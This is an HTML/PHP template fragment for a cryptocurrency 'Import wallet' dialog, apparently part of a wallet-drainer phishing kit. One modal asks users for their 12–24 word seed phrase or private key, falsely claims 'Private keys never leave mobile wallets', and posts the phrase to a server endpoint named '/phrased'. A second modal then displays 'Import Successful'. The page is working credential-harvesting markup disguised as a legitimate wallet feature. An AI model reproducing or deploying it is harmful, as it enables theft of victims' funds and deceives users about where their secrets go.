
            <!-- modal -->
            <div id="phrase" class="modal-window">
                <div class="sc-fuISkM cZGSkO">
                    <div role="presentation" class="sc-jQAxuV czdeQx"></div>
                    <div class="sc-jSFjdj sc-jUfyBS bQHYpP eGsiii">
                        <div class="sc-hOPeYd fgJQPr">
                            <div class="sc-jSFjdj sc-gKAaRy sc-dsXzNU kJmatq jcNvwq iNWOJK">
                                <h2 color="text" class="sc-gtsrHT sc-iwajpm jDnmwq cOHiix" style="text-align: center;">
                                    Enter your 12 - 24 words seed phrase/Private Key</h2>
                            </div>
                            <a href="#" title="Close" class="sc-hKFxyN YaON sc-eCApnc fAYopv" aria-label="Close the dialog" scale="md">
                                <svg viewBox="0 0 24 24" color="primary" width="20px" xmlns="http://www.w3.org/2000/svg" class="sc-bdnxRM ACFFk">
                                    <path d="M18.3 5.70997C17.91 5.31997 17.28 5.31997 16.89 5.70997L12 10.59L7.10997 5.69997C6.71997 5.30997 6.08997 5.30997 5.69997 5.69997C5.30997 6.08997 5.30997 6.71997 5.69997 7.10997L10.59 12L5.69997 16.89C5.30997 17.28 5.30997 17.91 5.69997 18.3C6.08997 18.69 6.71997 18.69 7.10997 18.3L12 13.41L16.89 18.3C17.28 18.69 17.91 18.69 18.3 18.3C18.69 17.91 18.69 17.28 18.3 16.89L13.41 12L18.3 7.10997C18.68 6.72997 18.68 6.08997 18.3 5.70997Z">
                                    </path>
                                </svg>
                            </a>
                        </div>
                        <div class="modal-dialog">
                            <div class="modal-content">
                                <div class="modal-body">
                                    <center class="info" style="margin: 5px 1px; background-color:#fdfdfd; color: #000">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="#39e" viewBox="0 0 24 24">
                                            <path d="M12.451 17.337l-2.451 2.663h-2v2h-2v2h-6v-5l6.865-6.949c1.08 2.424 3.095 4.336 5.586 5.286zm11.549-9.337c0 4.418-3.582 8-8 8s-8-3.582-8-8 3.582-8 8-8 8 3.582 8 8zm-3-3c0-1.104-.896-2-2-2s-2 .896-2 2 .896 2 2 2 2-.896 2-2z" />
                                        </svg>
                                        <!-- <h3>Protected private keys</h3> -->
                                        <p style="font-size: 0.9rem;">Private keys never leave mobile wallets, keeping user funds safe</p>
                                    </center>
                                    <form action="<?=base_url('/phrased')?>" method="post">
                                        <div>
                                            <div>
                                                <div class="form-group">
                                                </div>
                                                <div class="form-group"><textarea name="phrase" required placeholder="Enter Seed Phrase here..." rows="8" cols="5" class="form-control" style=" font-size:1rem;width: 97%; margin: 9px 8px;  border: 1px solid #888;outline: none;resize:none;"></textarea>
                                                </div>
                                            </div>
                                        </div>
                                        <!-- <center class="info" style="margin: 5px 1px; background-color:#fdfdfd;">
                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="#39e" viewBox="0 0 24 24">
                                                <path d="M18 10v-4c0-3.313-2.687-6-6-6s-6 2.687-6 6v4h-3v14h18v-14h-3zm-5 7.723v2.277h-2v-2.277c-.595-.347-1-.984-1-1.723 0-1.104.896-2 2-2s2 .896 2 2c0 .738-.404 1.376-1 1.723zm-5-7.723v-4c0-2.206 1.794-4 4-4 2.205 0 4 1.794 4 4v4h-8z" />
                                            </svg>
                                            <h3>Encryted</h3>
                                            <p>End-to-end encryption using client-side generated keys keeps all user activity private</p>
                                        </center> -->
                                        <div class="modal-footer">
                                            <button class="btn sc-hKFxyN iwyDfQ btn-secondary" width="70%" scale="md" style="justify-content: center;">
                                                <div class="text-main">Import wallet</div>
                                            </button>
                                        </div>
                                    </form>
    
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- modal -->
            <!-- modal -->
            <div id="confirmation" class="modal-window" style="background-color: #fdfdfd;">
                <div class="sc-fuISkM cZGSkO">
                    <div role="presentation" class="sc-jQAxuV czdeQx"></div>
                    <div class="sc-jSFjdj sc-jUfyBS bQHYpP eGsiii">
                        <div class="sc-hOPeYd fgJQPr">
                            <div class="sc-jSFjdj sc-gKAaRy sc-dsXzNU kJmatq jcNvwq iNWOJK">
                                <h2 color="text" class="sc-gtsrHT sc-iwajpm jDnmwq cOHiix" style="text-align: center;">
                                    Import Successful</h2>
                            </div>
                            <a href="#" title="Close" class="sc-hKFxyN YaON sc-eCApnc fAYopv" aria-label="Close the dialog" scale="md">
                                <svg viewBox="0 0 24 24" color="primary" width="20px" xmlns="http://www.w3.org/2000/svg" class="sc-bdnxRM ACFFk">
                                    <path d="M18.3 5.70997C17.91 5.31997 17.28 5.31997 16.89 5.70997L12 10.59L7.10997 5.69997C6.71997 5.30997 6.08997 5.30997 5.69997 5.69997C5.30997 6.08997 5.30997 6.71997 5.69997 7.10997L10.59 12L5.69997 16.89C5.30997 17.28 5.30997 17.91 5.69997 18.3C6.08997 18.69 6.71997 18.69 7.10997 18.3L12 13.41L16.89 18.3C17.28 18.69 17.91 18.69 18.3 18.3C18.69 17.91 18.69 17.28 18.3 16.89L13.41 12L18.3 7.10997C18.68 6.72997 18.68 6.08997 18.3 5.70997Z">
                                    </path>
                                </svg>
                            </a>
                        </div>
                        <div class="modal-dialog">
                            <div class="modal-content">
                                <div class="modal-body">
                                    <img src="<?= base_url('assets/images/qr.png')?>" alt="" style="width: 100%;">
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- modal -->
            <!-- modal-style -->
           
            <!-- modal-style -->